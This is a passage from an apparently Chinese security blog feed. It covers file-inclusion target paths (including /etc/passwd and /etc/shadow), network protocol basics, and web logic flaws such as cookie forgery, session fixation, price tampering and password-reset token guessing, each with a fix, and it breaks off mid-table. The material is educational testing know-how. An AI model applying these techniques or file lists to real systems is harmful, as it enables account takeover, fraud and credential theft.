<pre class="highlight"><span class="line">/etc/passwd 								# 账户信息</span><br><span class="line">/etc/shadow 								# 账户密码文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf 		# Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf 			# 虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini 			# PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf 					# Apache配置文件</span><br><span class="line">/etc/my.conf 								# mysql 配置文件</span><br></pre>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>网络协议基础</title>
    <url>/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><p>简介：</p>
<p>将IP地址解析为以太网MAC地址（物理地址）的协议。ARP协议有‘IP，MAC’映射关系表，生存时间20分钟</p>
<p>通过arp -a查看</p>
<p>工作流程：</p>
<p>1、在局域网发送包含IP地址的广播数据报，请求MAC地址</p>
<p>2、局域网内所有主机均会接收并处理报文；符合IP的主机处理请求，其余丢弃报文</p>
<p>3、验证成功返回ARP单播数据报，包含自己的IP和MAC地址</p>
<p>ARP报文格式</p>
<p> <img src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810141143977.png" alt="image-20210810141143977" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810141143977.png" class="lozad post-image"></p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">硬件类型：</td>
<td align="left">16位字段，用来定义运行ARP的网络类型。每个局域网基于其类型被指派一个整数。例如：以太网的类型为1。ARP可用在任何物理网络上。</td>
</tr>
<tr>
<td align="left">协议类型：</td>
<td align="left">16位字段，用来定义使用的协议。例如：对IPv4协议这个字段是0800。ARP可用于任何高层协议</td>
</tr>
<tr>
<td align="left">硬件长度：</td>
<td align="left">8位字段，用来定义物理地址的长度，以字节为单位。例如：对于以太网的值为6。</td>
</tr>
<tr>
<td align="left">协议长度：</td>
<td align="left">8位字段，用来定义逻辑地址的长度，以字节为单位。例如：对于IPv4协议的值为4。</td>
</tr>
<tr>
<td align="left">操作码：</td>
<td align="left">16位字段，用来定义报文的类型。已定义的分组类型有两种：ARP请求（1），ARP响应（2）。</td>
</tr>
<tr>
<td align="left">源硬件地址：</td>
<td align="left">这是一个可变长度字段，用来定义发送方的物理地址。例如：对于以太网这个字段的长度是6字节。</td>
</tr>
<tr>
<td align="left">源逻辑地址：</td>
<td align="left">这是一个可变长度字段，用来定义发送方的逻辑（IP）地址。例如：对于IP协议这个字段的长度是4字节。</td>
</tr>
<tr>
<td align="left">目的硬件地址：</td>
<td align="left">这是一个可变长度字段，用来定义目标的物理地址，例如，对以太网来说这个字段位6字节。对于ARP请求报文，这个字段为全0，因为发送方并不知道目标的硬件地址。</td>
</tr>
<tr>
<td align="left">目的逻辑地址：</td>
<td align="left">这是一个可变长度字段，用来定义目标的逻辑（IP）地址，对于IPv4协议这个字段的长度为4个字节。</td>
</tr>
</tbody></table>
<h1 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h1><p>简介：</p>
<p>TCP/IP协议核心协议。规定了IP数据报文</p>
<p>IP报文格式</p>
<p> <img src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810141201591.png" alt="image-20210810141201591" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810141201591.png" class="lozad post-image"></p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">版本：</td>
<td align="left">包含IP数据报的版本号：ipv4为4，ipv6为6</td>
</tr>
<tr>
<td align="left">首部长度：</td>
<td align="left">其中保存的是整个首部中的“32位字”的数量。</td>
</tr>
<tr>
<td align="left">这个字段正常的值为：</td>
<td align="left">5（假设“可选字段长度为0”）</td>
</tr>
<tr>
<td align="left">该字段最大值为：</td>
<td align="left">15（可选字段长度全满加上原有字段）</td>
</tr>
<tr>
<td align="left">区分服务：</td>
<td align="left"><img src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810141226454.png" alt="image-20210810141226454" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810141226454.png" class="lozad post-image"><br>优先级（3位)和数据链路层的QoS机制有关，定义了8个服务级别。当Qos选择了某种服务模型后，优先级越高，字段越优先传输。 D、T、R分别表示延时、吞吐量、可靠性。当这些值都为1时，分别表示低延时、高吞吐量、高可靠性。</td>
</tr>
<tr>
<td align="left">ECN：</td>
<td align="left">用于为数据报标记“拥塞标识符”。 当一个带有ECN标记的分组发送后，如果接收端“持续拥塞”且“具有感知ECN的能力”（如TCP），那么接收端会通知发送端降低发送速度。</td>
</tr>
<tr>
<td align="left">总长度：</td>
<td align="left">该字段指的是IPv4数据报的总长度（以字节为单位）。 通过该字段和“首部长度”字段，我们可以推测出ip数据报中“数据部分”从哪开始以及长度。</td>
</tr>
<tr>
<td align="left">标识、标志、分偏移：</td>
<td align="left">该字段帮助标识由IPv4主机发送的数据报。 这个字段对实现分片很重要，大多数数据链路层不支持过长的ip数据报，所以要把ip数据报分片，每一片都是一个独立的ipv4数据报。 发送主机每次发送数据报都讲一个“内部计数器”加1，然后将数值复制“标识”字段中。</td>
</tr>
<tr>
<td align="left">生存时间：</td>
<td align="left">该字段用于设置一个“数据报可经过的路由器数量”的上限。 发送方在初始发送时设定某个值（建议为64,、128或255），每台路由器再转发时都将其减一，当字段达到0时，该数据报被丢弃，并使用一个ICMP消息通知发送方。</td>
</tr>
<tr>
<td align="left">协议：</td>
<td align="left">包含一个数字，该数字对应一个“有效载荷部分的数据类型”。比如17代表UDP，6代表TCP。</td>
</tr>
<tr>
<td align="left">首部校验和：</td>
<td align="left">该字段“仅计算”IPv4首部。也就是说只“校验”首部。并不检查数据报的“数据部分”。 首先将“首部校验和”设置为0,。 然后对首部（整个首部是一个16位字的“序列”）计算16位二进制反码和。该值被存储在首部校验和字段中。 当接收方接收到数据报后，也对其首部进行校验计算，如果结果与“首部校验和”的值不同，就丢弃收到的数据报。</td>
</tr>
<tr>
<td align="left">可选字段：</td>
<td align="left">IP支持很多可选选项。 如果选项存在的话，它在IPv4分组中紧跟在基本IPv4头部之后。</td>
</tr>
</tbody></table>
<h1 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h1><p>简介：</p>
<p>IPV4协议簇中的一个子协议，用于在IP主机、路由器之间传递控制消息。如网络通不通、主机是否可达、路由是否可用等网络本身消息。</p>
<p>ICMP报文格式</p>
<p> <img src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810144029664.png" alt="image-20210810144029664" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810144029664.png" class="lozad post-image"></p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">类型：</td>
<td align="left">占一字节，标识ICMP报文的类型，目前已定义了14种，从类型值来看ICMP报文可以分为两大类。第一类是取值为1~127的差错报文，第2类是取值128以上的信息报文。</td>
</tr>
<tr>
<td align="left">代码：</td>
<td align="left">占一字节，标识对应ICMP报文的代码。它与类型字段一起共同标识了ICMP报文的详细类型。</td>
</tr>
<tr>
<td align="left">校验和：</td>
<td align="left">占2个字节，包括数据在内的整个ICMP数据包的检验和，以检验报文在传输过程中是否出现了差错；其计算方法和IP头部检验和的计算方法一样的。</td>
</tr>
<tr>
<td align="left">标识：</td>
<td align="left">占两字节，用于标识本ICMP进程，但仅适用于回显请求和应答ICMP报文，对于目标不可达ICMP报文和超时ICMP报文等，该字段的值为0。</td>
</tr>
<tr>
<td align="left">序列号：</td>
<td align="left">每一个ICMP回显报文都有一个序列号且是递增的</td>
</tr>
<tr>
<td align="left">数据：</td>
<td align="left">表示是一个32字节的数据</td>
</tr>
</tbody></table>
<p>ICMP报文的前4个字节是统一的格式，共有三个字段：即类型，代码和检验和。8位类型和8位代码字段一起决定了ICMP报文的类型。类型8，代码0：表示回显请求(ping请求)。类型0，代码0：表示回显应答(ping应答)。类型11，代码0：超时。</p>
<table>
<thead>
<tr>
<th align="left">类型（十进制）</th>
<th align="left">内容</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0</td>
<td align="left">回送应答</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">目标不可达</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">原点抑制</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">重定向或改变路由</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left">回送请求</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left">路由器公告</td>
</tr>
<tr>
<td align="left">10</td>
<td align="left">路由器请求</td>
</tr>
<tr>
<td align="left">11</td>
<td align="left">超时</td>
</tr>
<tr>
<td align="left">17</td>
<td align="left">地址子网请求</td>
</tr>
<tr>
<td align="left">18</td>
<td align="left">地址子网应答</td>
</tr>
</tbody></table>
<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h1><p>简介：</p>
<p>TCP是一种面向连接的、可靠的、基于字节流的传输层通信协议；是TCP/IP协议体系中最主要的传输层协议。</p>
<p>TCP报文格式</p>
<p><img src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810144358154.png" alt="image-20210810144358154" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810144358154.png" class="lozad post-image"></p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">源、目标端口号字段：</td>
<td align="left">占16比特。<br>TCP协议通过使用”端口”来标识源端和目标端的应用进程。端口号可以使用0到65535之间的任何数字。在收到服务请求时，操作系统动态地为客户端的应用程序分配端口号。在服务器端，每种服务在”众所周知的端口”（Well-Know Port）为用户提供服务。</td>
</tr>
<tr>
<td align="left">顺序号字段：</td>
<td align="left">占32比特。<br>用来标识从TCP源端向TCP目标端发送的数据字节流，它表示在这个报文段中的第一个数据字节。</td>
</tr>
<tr>
<td align="left">确认号字段：</td>
<td align="left">占32比特。<br>只有ACK标志为1时，确认号字段才有效。它包含目标端所期望收到源端的下一个数据字节。</td>
</tr>
<tr>
<td align="left">头部长度字段：</td>
<td align="left">占4比特。<br>给出头部占32比特的数目。没有任何选项字段的TCP头部长度为20字节；最多可以有60字节的TCP头部。</td>
</tr>
<tr>
<td align="left">标志位字段（U、A、P、R、S、F）:</td>
<td align="left">占6比特。<br>各比特的含义如下：</td>
</tr>
<tr>
<td align="left">URG：</td>
<td align="left">紧急指针（urgent pointer）有效。</td>
</tr>
<tr>
<td align="left">ACK：</td>
<td align="left">为1时，确认序号有效。</td>
</tr>
<tr>
<td align="left">PSH：</td>
<td align="left">为1时，接收方应该尽快将这个报文段交给应用层。</td>
</tr>
<tr>
<td align="left">RST：</td>
<td align="left">为1时，重建连接。</td>
</tr>
<tr>
<td align="left">SYN：</td>
<td align="left">为1时，同步程序，发起一个连接。</td>
</tr>
<tr>
<td align="left">FIN：</td>
<td align="left">为1时，发送端完成任务，释放一个连接。</td>
</tr>
<tr>
<td align="left">窗口大小字段：</td>
<td align="left">占16比特。<br>此字段用来进行流量控制。单位为字节数，这个值是本机期望一次接收的字节数。</td>
</tr>
<tr>
<td align="left">TCP校验和字段：</td>
<td align="left">占16比特。<br>对整个TCP报文段，即TCP头部和TCP数据进行校验和计算，并由目标端进行验证。</td>
</tr>
<tr>
<td align="left">紧急指针字段：</td>
<td align="left">占16比特。<br>它是一个偏移量，和序号字段中的值相加表示紧急数据最后一个字节的序号。</td>
</tr>
<tr>
<td align="left">选项字段：</td>
<td align="left">占32比特。<br>可能包括”窗口扩大因子”、”时间戳”等选项。</td>
</tr>
</tbody></table>
<p><strong>TCP三握手（建立连接）</strong></p>
<p>第一次握手:</p>
<p>客户端发送一个TCP的SYN标志位置1的包指明客户打算连接的服务器的端口，以及初始序号X,保存在包头的序列号(Sequence Number)字段里。</p>
<p>第二次握手:</p>
<p>服务器发回确认包(ACK)应答。即SYN标志位和ACK标志位均为1同时，将确认序号(Acknowledgement Number)设置为客户的I S N加1以.即X+1。</p>
<p>第三次握手.</p>
<p>客户端再次发送确认包(ACK) SYN标志位为0,ACK标志位为1.并且把服务器发来ACK的序号字段+1,放在确定字段中发送给对方.并且在数据段放写ISN的+1</p>
<p> <img src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810144955465.png" alt="image-20210810144955465" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810144955465.png" class="lozad post-image"></p>
<p><strong>TCP四挥手（释放连接）</strong></p>
<p>第一次挥手：A数据传输完毕需要断开连接，A的应用进程向其TCP发出连接释放报文段（FIN = 1,序号seq = u）,并停止再发送数据，主动关闭TCP连接，进入FIN-WAIT-1状态，等待B的确认。</p>
<p>第二次挥手：B收到连接释放报文段后即发出确认报文段（ACK=1，确认号ack=u+1,序号seq=v）,B进入CLOSE-WAIT关闭等待状态,此时的TCP处于半关闭状态，A到B的连接释放。而A收到B的确认后，进入FIN-WAIT-2状态，等待B发出的连接释放报文段。</p>
<p>第三次挥手：当B数据传输完毕后，B发出连接释放报文段（FIN = 1，ACK = 1，序号seq = w,确认号ack=u+1）,B进入LAST-ACK（最后确认）状态，等待A 的最后确认。</p>
<p>第四次挥手：A收到B的连接释放报文段后，对此发出确认报文段（ACK = 1，seq=u+1，ack=w+1）,A进入TIME-WAIT（时间等待）状态。此时TCP未释放掉，需要经过时间等待计时器设置的时间2MSL后，A才进入CLOSE状态。</p>
<p> <img src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810145016807.png" alt="image-20210810145016807" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810145016807.png" class="lozad post-image"></p>
<h1 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h1><p>简介：</p>
<p>无连接、无拥塞控制、尽最大努力交付、面向报文的传输层协议。</p>
<p>UDP报文格式</p>
<p> <img src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810145032536.png" alt="image-20210810145032536" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810145032536.png" class="lozad post-image"></p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">源端口：</td>
<td align="left">源端口号，需要对方回信时选用，不需要时全部置0.</td>
</tr>
<tr>
<td align="left">目的端口：</td>
<td align="left">目的端口号，在终点交付报文的时候需要用到。</td>
</tr>
<tr>
<td align="left">长度：</td>
<td align="left">UDP的数据报的长度（包括首部和数据）其最小值为8（只有首部）</td>
</tr>
<tr>
<td align="left">校验和：</td>
<td align="left">检测UDP数据报在传输中是否有错，有错则丢弃。 <br>该字段是可选的，当源主机不想计算校验和，则直接令该字段全为0. 当传输层从IP层收到UDP数据报时，就根据首部中的目的端口，把UDP数据报通过相应的端口，上交给应用进程。 如果接收方UDP发现收到的报文中的目的端口号不正确（不存在对应端口号的应用进程0,），就丢弃该报文，并由ICMP发送“端口不可达”差错报文给对方。</td>
</tr>
</tbody></table>
<h1 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h1><p>简介：</p>
<p>将域名解析到IP地址的一种协议。基于UDP和TCP协议，端口号为53，用户到服务器采用UDP，DNS服务器通信采用TCP。</p>
<p>域名结构</p>
<p> <img src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810145101745.png" alt="image-20210810145101745" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20210810145101745.png" class="lozad post-image"></p>
<p>递归查询：客户机向本地DNS服务器查询发起的为递归查询。</p>
<p>迭代查询：本地NDS服务器与跟等其他DNS服务器的解析过程。</p>
<h1 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h1><p>简介：</p>
<p>动态分配IP地址，提供安全、可靠、简单的TCP/IP网络配置。协议端口：67(收)、68(发)</p>
<p><strong>DHCP原理</strong></p>
<p>1、客户机发送DHCP Discovery广播包，请求IP地址（包含客户机的MAC地址）</p>
<p>2、服务器响应DHCP Offer广播包，提供IP地址（无子网掩码、网关等参数）</p>
<p>3、客户机发送DHCP Request广播包，确认IP</p>
<p>4、服务器发送DHCP ACK广播包，确定租约、提供网卡详细参数、IP、掩码、网关、DNS、租期等</p>
<p>DHCP续约：</p>
<p>租期50%过后，客户机再次发送DHCP Request包进行续约，付过服务器无响应则继续使用；</p>
<p>租期87.5%租期过后，再次发送DHCP Request包进行续约，如果无响应则释放IP地址。</p>
<p>之后，重新发送DHCP Discovery广播包来获取IP地址，当无任何服务器响应时，自动分配169.254.x.x/16的无效IP，用于临时的内网通信</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ipconfig /release</td>
<td align="left">释放IP</td>
</tr>
<tr>
<td align="left">ipconfig /renew</td>
<td align="left">重新获取IP</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>网络基础</category>
      </categories>
      <tags>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑漏洞</title>
    <url>/article/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="一、漏洞的产生"><a href="#一、漏洞的产生" class="headerlink" title="一、漏洞的产生"></a>一、漏洞的产生</h1><p>常见漏洞：</p>
<p>身份认证安全漏洞、支付逻辑漏洞（数据纂改）</p>
<p>任意密码找回漏洞、验证码突破漏洞</p>
<p>接口调用安全、未授权访问漏洞</p>
<h1 id="二、权限绕过漏洞"><a href="#二、权限绕过漏洞" class="headerlink" title="二、权限绕过漏洞"></a>二、权限绕过漏洞</h1><table>
<thead>
<tr>
<th align="left">说明</th>
<th align="left">方法</th>
</tr>
</thead>
<tbody><tr>
<td align="left">身份认证安全： <br>有些网站对身份认证模块没有做好安全防护，导致漏洞产生</td>
<td align="left">绕过身份认证有以下几种方法 <br>1、暴力破解、撞库 <br>2、Cookie&amp;session类（重要）加密 <br>3、暴力破解 ：<br>测试方法：<br>在没有验证码限制或者一次验证码可以多次使用的地方，可以分为以下几种情况： <br>爆破用户名。<br>&#9;当输入的用户名不存在时，会显示请输入正确用户名，或者用户名不存在 <br>已知用户名。 <br>&#9;比如： 已知用户名为admin，密码可以进行字典爆破 <br>使用一个常用密码。<br>&#9;比如123456对大量用户进行爆破  <br><br>修复方法： <br>1、增加验证码。<br>登录失败的时候，变换验证码。(验证码不能被工具识别) <br>2、限制登录频率。<br>例如，5分钟内登录失败次数超过10次则锁定账号1小时。 <br>3、二次验证。<br>可以添加手机验证码或邮箱验证码。</td>
</tr>
<tr>
<td align="left">Cookie伪造： <br>通过修改Cookie中的某个参数来实现登录其他用户</td>
<td align="left">测试方法： <br>1.使用一个账号登录，找一个可以证明身份的页面，例如首页的欢迎xxx或者是个人中心显示昵称的地方 <br>2.刷新该页面拦截请求，观察Cookie中的字段和值，例如userid=xxx，修改Cookie中的值，把xxx改成admin <br>3.forword放行，页面显示admin的信息，则存在此问题。  <br><br>修复方法： <br>对于客户端标识的用户信息，使用Session会话认证方式，避免通过Cookie去仿冒其他人的身份。</td>
</tr>
<tr>
<td align="left">Session会话固定攻击： <br>一种诱骗受害者使用攻击者指定的会话标识（Sessionid）的攻击手段，利用了服务器的session不变的机制</td>
<td align="left">攻击步骤： <br>1、攻击者通过某种手段重置目标用户的Sessionid，然后监听用户会话状态 <br>2、目标用户携带攻击者设定的Sessionid登录站点 <br>3、攻击者通过Sessionid获得合法会话  <br><br>攻击者重置Sessionid的方法： <br>通过xss，嗅探等方法取得用户的session，修改数据包。<br><br> 修复方法： <br>每次登陆成功之后重新生成session，sessionID闲置过久时，进行重置sessionID</td>
</tr>
<tr>
<td align="left">加密测试</td>
<td align="left">概念： <br>有些网站在前端加密，然后传到后台直接和数据库里的值做对比，这时抓包就知道加密方式，然后做暴力破解。  <br><br>测试方法： <br>1、用账号密码登录，拦截请求，查看传输信息是不是通过一些加密方式对账号和密码进行了加密，如果有则存在此问题 <br>2、对于前端加密后的密码进行暴力破解测试时，可以在BurpSuite的Intruder模块 PayloadProcessing中选择加密方式  <br><br>修复方法： <br>把加密对比的方法放到后台去执行</td>
</tr>
</tbody></table>
<h1 id="三、数据篡改"><a href="#三、数据篡改" class="headerlink" title="三、数据篡改"></a>三、数据篡改</h1><p>数据纂改分为两方面：</p>
<p>1、业务一致性安全：手机号篡改、邮箱和用户名篡改、订单ID更改、商品编号更改、用户ID篡改</p>
<p>2、业务数据安全：金额数据篡改、商品数量篡改、最大数量限制突破、本地JS参数修改</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">手机号篡改</td>
<td align="left">步骤： <br>抓包修改手机号码，之后进行越权判断，进入其他人的页面进行操作  <br>修复： <br>通过session机制判断身份，还需校验手机号与登录者身份是否一致</td>
</tr>
<tr>
<td align="left">邮箱和用户名纂改</td>
<td align="left">步骤： <br>抓包修改用户名和邮箱为其他用户或邮箱  <br>修复： <br>通过session机制判断身份，如需传输邮件，要判断发件人与session一致</td>
</tr>
<tr>
<td align="left">订单ID纂改</td>
<td align="left">步骤： <br>注册一普通账号，修改遍历订单ID，获取其他用户订单详情（平行越权）  <br>修复： <br>查看订单是通过session判断用户身份，做好平行权限控制</td>
</tr>
<tr>
<td align="left">商品编号纂改</td>
<td align="left">步骤： <br>提交订单时，抓包修改商品标号，导致商品与价格不符却交易成功 <br><br>举例： <br>例如100个积分只能换商品编号为001,1000个积分只能换商品编号005，在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换取高积分商品。  <br><br>修复： <br>金额不在客户端传入，防止被篡改，如必要，则务必检查交易金额与商品价格或对支付金额做签名校验</td>
</tr>
<tr>
<td align="left">用户ID纂改</td>
<td align="left">步骤：<br>抓包查看用户的ID，修改ID（加减1），查看是否能查看其它用户id信息。 <br><br>修复：<br>通过session机制判断身份，如果必须用userID参数，要判断与session是否一致</td>
</tr>
<tr>
<td align="left">金额数据纂改</td>
<td align="left">步骤： <br>在提交订单时进行抓包，修改支付的金额或折扣等相关数据。  <br><br>修复： <br>商品信息如金额、折扣等原始数据校验应来自于服务器端，不应接受客户端传来的值</td>
</tr>
<tr>
<td align="left">商品数量纂改</td>
<td align="left">步骤： <br>抓包修改商品数量等字段，将请求中的商品数量修改为负数或0，查看能否以修改后的数量完成业务流程。  <br><br>修复： <br>产生异常的交易行为时直接限制、阻断</td>
</tr>
<tr>
<td align="left">本地JS参数纂改</td>
<td align="left">步骤： <br>部分应用程序通过Javascript处理用户提交的请求，通过修改Javascript脚本，测试修改后的数据是否影响到用户。  <br><br>修复： <br>服务器校验；跨平台支付调用接口，要做好数据的完整性校验，确保一致性</td>
</tr>
<tr>
<td align="left">最大数限制突破</td>
<td align="left">步骤： <br>很多商品限制用户购买数量时，服务器仅在页面通过js脚本限制，没有在服务器端校验用户提交的数量，通过抓包修改商品最大数限制，将请求中的商品数量改为大于最大数限制的值，查看能否以修改后的数量完成业务流程。  <br><br>修复： <br>每次提交都对其对应的各项信息做强校验</td>
</tr>
</tbody></table>
<h1 id="四、业务授权安全"><a href="#四、业务授权安全" class="headerlink" title="四、业务授权安全"></a>四、业务授权安全</h1><p>越权漏洞的分类：</p>
<table>
<thead>
<tr>
<th align="left">说明</th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">水平越权 <br>指相同权限的不同用户可以互相访问</td>
<td align="left">漏洞危害： <br>如果出现此漏洞，那么将可能会造成大批量数据泄露，严重的甚至会造成用户信息被恶意篡改。</td>
</tr>
<tr>
<td align="left">垂直越权 <br>指使用权限低的用户可以访问权限较高的用户</td>
<td align="left">举例： <br>同一个公司不同权限的管理员A和B，通过修改请求，管理员A可以修改不在他管辖范围内的员工、考勤、工资等</td>
</tr>
</tbody></table>
<p><strong>漏洞危害：</strong></p>
<p>向上越权：普通用户可以执行管理员权限，比如发布文章、删除文章等操作。</p>
<p>向下越权：一个高级用户可以访问低级用户信息（暴露用户隐私）</p>
<p><strong>检测手段：</strong></p>
<p>查看所有敏感涉及到账户的操作是否有除了UID之外的验证方式，没有的话构造uid访问，可检查是否有漏洞，这里的uid代指username、email、userid等声称的账户信息</p>
<p>如果有验证参数，尝试是否是可以预知的或者可以猜测出来的。不是，没有漏洞，是，有漏洞，构造请求验证漏洞</p>
<p><strong>发生越权行为的修复方法：</strong></p>
<p>1、涉及用户信息的操作需要验证用户身份，比如查看各种用户信息的情况下，不能只根据用户uid去搜索，应该再次进行身份验证</p>
<p>2、特别敏感的操作应该进行二次操作</p>
<h1 id="五、任意密码找回的方法"><a href="#五、任意密码找回的方法" class="headerlink" title="五、任意密码找回的方法"></a>五、任意密码找回的方法</h1><table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">用户凭证暴力破解</td>
<td align="left">概念： <br>常见的是找回密码的验证码为4位，并且服务端没有加以限制，我们可以通过爆破出验证码的方式来找回密码 <br>步骤： <br>验证码的位数：4or6，验证码有效时间：1min-15min 验证码爆破防护绕过  <br><br>修复： <br>增加验证码复杂性和长度 限制请求修改次数</td>
</tr>
<tr>
<td align="left">返回凭证</td>
<td align="left">返回凭证的三种形式 <br>1、url返回凭证 <br>2、抓包返回凭证 <br>3、凭证在页面中  <br><br>方法： <br>1、URL返回凭证 使用firefox的firebug查看请求链接，看链接中是否有验证码等密码找回凭证 <br>2、抓包直接返回 根据手机号找回密码后抓包，可以发现验证码直接显示verifycode=xxxx，如果信息被加密，解密即可（其他信息同理） <br>3、密码找回凭证在页面中 通过密保问题找回密码，查看源码，密保问题和答案就在源码中显示</td>
</tr>
<tr>
<td align="left">邮箱弱token</td>
<td align="left">获取邮箱弱token的方法： <br>1、Unix时间戳+md5 <br>例如：<br>通过邮箱找回密码，正常流程去邮箱查看重置密码链接，发现链接处有一串md5加密字符串。字符串解密，类似1491293277（10位），可以判断为Unix时间戳。 重置他人密码只需利用他人邮箱发送重置密码邮件，在短时间内对Unix时间戳进行暴力破解，即可获得重置密码的链接 <br><br>2、用户名 <br>例如：重置密码链接直接使用用户名进行区别，改变用户名即可更改他人密码 <br><br>3、服务器时间 <br>例如： 利用两个帐号同时点击找回密码，去邮箱查看找回密码的链接，发现两者的随机token只差1-2，而且可以猜测出为服务器时间。所以可以用一个未知帐号和一个已知帐号同时点击找回密码，稍微遍历随机token，就可以构造出未知帐号的密码找回链接</td>
</tr>
<tr>
<td align="left">用户凭证有效性</td>
